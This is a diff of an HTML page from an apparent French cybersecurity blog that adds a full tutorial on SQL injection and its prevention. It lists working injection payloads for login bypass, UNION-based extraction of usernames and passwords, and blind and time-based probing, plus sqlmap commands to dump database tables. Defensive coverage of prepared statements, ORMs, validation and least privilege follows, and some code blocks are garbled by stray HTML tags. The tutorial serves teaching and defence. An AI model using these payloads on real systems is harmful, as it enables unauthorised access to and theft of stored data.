@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Injection SQL : comprendre et se protéger — Temgus.CyberBlog</title>
 <meta name="description" content="Fonctionnement des injections SQL et techniques de protection des bases de données.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/injection-sql.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/injection-sql.html">
 <meta property="og:title" content="Injection SQL : comprendre et se protéger — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Injection SQL : comprendre et se protéger — Temgus.CyberBlog">
 <meta name="twitter:description" content="Fonctionnement des injections SQL et techniques de protection des bases de données.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,473 @@
   "headline": "Injection SQL : comprendre et se protéger",
   "description": "Fonctionnement des injections SQL et techniques de protection des bases de données.",
   "datePublished": "2025-04-15",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/injection-sql.html",
   "inLanguage": "fr",
   "keywords": "SQLi, base de données, OWASP",
-  "timeRequired": "PT9M"
+  "timeRequired": "PT9M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">💉</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Injection SQL : comprendre et se protéger</h1>
-  <p style="color:#8892a4;max-width:500px">Fonctionnement des injections SQL et techniques de protection des bases de données.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#injection-sql" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">💉</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Injection SQL : comprendre et se protéger</div>
+      <div class="meta-details">
+        <span>📅 2025-04-15</span>
+        <span>⏱ 9 min de lecture</span>
+        <span>🏷 Intermédiaire</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#comment-fonctionne-une-injection-sql">Comment fonctionne une injection SQL</a></li>
+<li><a href="#types-d-injections-sql">Types d'injections SQL</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#1-injection-classique-in-band-">1. Injection classique (In-band)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#2-union-based-injection">2. UNION-based injection</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#3-blind-sql-injection">3. Blind SQL Injection</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#4-sqlmap-automatisation">4. SQLMap — Automatisation</a></li>
+<li><a href="#comment-se-prot-ger">Comment se protéger</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#1-requ-tes-pr-par-es-prepared-statements-">1. Requêtes préparées (Prepared Statements)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#2-orm-object-relational-mapping-">2. ORM (Object-Relational Mapping)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#3-validation-et-assainissement-des-entr-es">3. Validation et assainissement des entrées</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#4-principe-du-moindre-privil-ge-pour-la-base-de-donn-es">4. Principe du moindre privilège pour la base de données</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#5-waf-web-application-firewall-">5. WAF (Web Application Firewall)</a></li>
+<li><a href="#checklist-anti-injection-sql">Checklist anti-injection SQL</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Injection SQL : comprendre et se protéger</h1>
+
+<p>L'injection SQL est classée <strong>#3 dans l'OWASP Top 10</strong> depuis des années. Elle permet à un attaquant de manipuler les requêtes SQL d'une application pour extraire, modifier ou supprimer des données. Des millions de sites restent vulnérables aujourd'hui.</p>
+
+<h2 id="comment-fonctionne-une-injection-sql">Comment fonctionne une injection SQL</h2>
+
+<p>Une application web vulnérable construit ses requêtes SQL en <strong>concaténant directement les entrées utilisateur</strong> :</p>
+
+<pre><code class="language-php">// Code PHP vulnérable
+<p>$username = $_GET['username'];  // Entrée utilisateur non filtrée</p>
+<p>$query = "SELECT * FROM users WHERE username = '$username'";</p>
+<p>// Si username = "admin" → SELECT * FROM users WHERE username = 'admin'</code></pre>
+
+<p>Un attaquant entre à la place : <code>admin' OR '1'='1</code></p>
+
+<pre><code class="language-sql">-- Ce que ça génère :
+<p>SELECT * FROM users WHERE username = 'admin' OR '1'='1'</p>
+<p>--                                              ^^^^^^^^</p>
+<p>--                              Toujours vrai → retourne TOUS les utilisateurs !</code></pre>
+
+<h2 id="types-d-injections-sql">Types d'injections SQL</h2>
+
+<h3 id="1-injection-classique-in-band-">1. Injection classique (In-band)</h3>
+
+<pre><code class="language-sql">-- Contournement d'authentification
+<p>' OR '1'='1</p>
+<p>' OR '1'='1' --</p>
+<p>admin' --</p>
+<p>' OR 1=1 --</p>
+
+<p>-- Exemple sur un login :</p>
+<p>Username: admin' --</p>
+<p>Password: n'importe_quoi</p>
+
+<p>-- Requête générée :</p>
+<p>SELECT * FROM users WHERE username='admin' --' AND password='n'importe_quoi'</p>
+<p>-- Le -- commente le reste → le mot de passe n'est plus vérifié !</code></pre>
+
+<h3 id="2-union-based-injection">2. UNION-based injection</h3>
+
+<p>Permet d'extraire des données d'autres tables :</p>
+
+<pre><code class="language-sql">-- Identifier le nombre de colonnes
+<p>' ORDER BY 1 --</p>
+<p>' ORDER BY 2 --</p>
+<p>' ORDER BY 3 --   ← Erreur = il y a 2 colonnes</p>
+
+<p>-- Extraire des données avec UNION</p>
+<p>' UNION SELECT username, password FROM users --</p>
+
+<p>-- Exemples de données intéressantes</p>
+<p>' UNION SELECT table_name, null FROM information_schema.tables --</p>
+<p>' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --</p>
+<p>' UNION SELECT username, password FROM users --</code></pre>
+
+<h3 id="3-blind-sql-injection">3. Blind SQL Injection</h3>
+
+<p>L'application ne retourne pas les données mais on peut poser des questions vraie/fausse :</p>
+
+<pre><code class="language-sql">-- Boolean-based blind
+<p>' AND 1=1 --    ← Page normale (vrai)</p>
+<p>' AND 1=2 --    ← Page différente (faux)</p>
+
+<p>-- Extraire caractère par caractère</p>
+<p>' AND SUBSTRING(username,1,1)='a' --</p>
+<p>' AND SUBSTRING(username,1,1)='b' --</p>
+<p>... jusqu'à trouver le bon caractère</p>
+
+<p>-- Time-based blind (si aucune différence visible)</p>
+<p>' AND SLEEP(5) --        ← MySQL : délai de 5 secondes = vulnérable</p>
+<p>' AND pg_sleep(5) --     ← PostgreSQL</p>
+<p>' WAITFOR DELAY '0:0:5'  ← MSSQL</code></pre>
+
+<h3 id="4-sqlmap-automatisation">4. SQLMap — Automatisation</h3>
+
+<pre><code class="language-bash"># SQLMap automatise la détection et l'exploitation des injections SQL
+<h1>À utiliser UNIQUEMENT sur des systèmes que vous êtes autorisé à tester</h1>
+
+<h1>Test basique</h1>
+<p>sqlmap -u "http://exemple.com/page?id=1"</p>
+
+<h1>Avec cookie d'authentification</h1>
+<p>sqlmap -u "http://exemple.com/page?id=1" --cookie="session=abc123"</p>
+
+<h1>Extraire les bases de données</h1>
+<p>sqlmap -u "http://exemple.com/page?id=1" --dbs</p>
+
+<h1>Extraire les tables d'une base</h1>
+<p>sqlmap -u "http://exemple.com/page?id=1" -D nom_bdd --tables</p>
+
+<h1>Extraire les données d'une table</h1>
+<p>sqlmap -u "http://exemple.com/page?id=1" -D nom_bdd -T users --dump</p>
+
+<h1>Test sur un formulaire POST</h1>
+<p>sqlmap -u "http://exemple.com/login" --data="username=admin&amp;password=test"</code></pre>
+
+<h2 id="comment-se-prot-ger">Comment se protéger</h2>
+
+<h3 id="1-requ-tes-pr-par-es-prepared-statements-">1. Requêtes préparées (Prepared Statements)</h3>
+
+<p><strong>La solution principale</strong> — séparer le code SQL des données.</p>
+
+<pre><code class="language-python"># Python avec SQLite - VULNÉRABLE
+<p>username = request.form['username']</p>
+<p>cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")</p>
+
+<h1>Python avec SQLite - SÉCURISÉ (requête préparée)</h1>
+<p>username = request.form['username']</p>
+<p>cursor.execute("SELECT * FROM users WHERE username = ?", (username,))</p>
+<h1>Le ? est un placeholder - les données ne sont JAMAIS interprétées comme du SQL</code></pre></h1>
+
+<pre><code class="language-php">// PHP avec PDO - SÉCURISÉ
+<p>$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :username");</p>
+<p>$stmt-&gt;execute(['username' =&gt; $username]);</p>
+<p>$user = $stmt-&gt;fetch();</code></pre>
+
+<pre><code class="language-javascript">// Node.js avec mysql2 - SÉCURISÉ
+<p>const [rows] = await connection.execute(</p>
+<p>'SELECT * FROM users WHERE username = ?',</p>
+<p>[username]</p>
+<p>);</code></pre>
+
+<pre><code class="language-java">// Java avec PreparedStatement - SÉCURISÉ
+<p>PreparedStatement stmt = conn.prepareStatement(</p>
+<p>"SELECT * FROM users WHERE username = ?"</p>
+<p>);</p>
+<p>stmt.setString(1, username);</p>
+<p>ResultSet rs = stmt.executeQuery();</code></pre>
+
+<h3 id="2-orm-object-relational-mapping-">2. ORM (Object-Relational Mapping)</h3>
+
+<pre><code class="language-python"># SQLAlchemy (Python) - Immunisé contre SQLi par défaut
+<p>user = User.query.filter_by(username=username).first()</p>
+
+<h1>Sequelize (Node.js)</h1>
+<p>const user = await User.findOne({ where: { username: username } });</p>
+
+<h1>Ces ORMs génèrent automatiquement des requêtes préparées</code></pre></h1>
+
+<h3 id="3-validation-et-assainissement-des-entr-es">3. Validation et assainissement des entrées</h3>
+
+<pre><code class="language-python">import re
+
+<p>def valider_username(username):</p>
+<p># Whitelist : seulement lettres, chiffres, tirets et underscores</p>
+<p>if not re.match(r'^[a-zA-Z0-9_-]{3,50}$', username):</p>
+<p>raise ValueError("Username invalide")</p>
+<p>return username</p>
+
+<p>def valider_id(id_str):</p>
+<p># Un ID doit être un entier</p>
+<p>try:</p>
+<p>return int(id_str)</p>
+<p>except ValueError:</p>
+<p>raise ValueError("ID invalide")</code></pre>
+
+<h3 id="4-principe-du-moindre-privil-ge-pour-la-base-de-donn-es">4. Principe du moindre privilège pour la base de données</h3>
+
+<pre><code class="language-sql">-- Créer un utilisateur avec seulement les droits nécessaires
+<p>CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'mot_de_passe_fort';</p>
+
+<p>-- Accorder seulement SELECT, INSERT, UPDATE (pas DELETE ni DROP !)</p>
+<p>GRANT SELECT, INSERT, UPDATE ON ma_base.* TO 'webapp'@'localhost';</p>
+
+<p>-- NE JAMAIS utiliser root pour l'application web</p>
+<p>-- JAMAIS : mysql_connect("localhost", "root", "")</code></pre>
+
+<h3 id="5-waf-web-application-firewall-">5. WAF (Web Application Firewall)</h3>
+
+<pre><code class="language-nginx"># ModSecurity avec Nginx
+<p>modsecurity on;</p>
+<p>modsecurity_rules_file /etc/nginx/modsec/main.conf;</p>
+<h1>Détecte et bloque automatiquement les patterns SQLi connus</code></pre></h1>
+
+<h2 id="checklist-anti-injection-sql">Checklist anti-injection SQL</h2>
+
+<pre><code>✅ Requêtes préparées partout (jamais de concaténation)
+<p>✅ ORM pour les opérations CRUD standard</p>
+<p>✅ Validation stricte des entrées (type, longueur, format)</p>
+<p>✅ Utilisateur BD avec droits minimum</p>
+<p>✅ Messages d'erreur génériques (ne pas exposer la structure BD)</p>
+<p>✅ WAF en complément</p>
+<p>✅ Tests réguliers avec SQLMap et OWASP ZAP</p>
+<p>✅ Logs des erreurs SQL (pour détecter les tentatives)</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>L'injection SQL est l'une des vulnérabilités les plus anciennes et pourtant encore très présente. La règle est simple : <strong>jamais de concaténation de données utilisateur dans du SQL</strong>. Les requêtes préparées règlent 99% des problèmes.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#injection-sql" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/osint.html" class="nav-prev">← OSINT : trouver des informations en source ouverte</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-docker.html" class="nav-next">Sécurité des conteneurs Docker →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
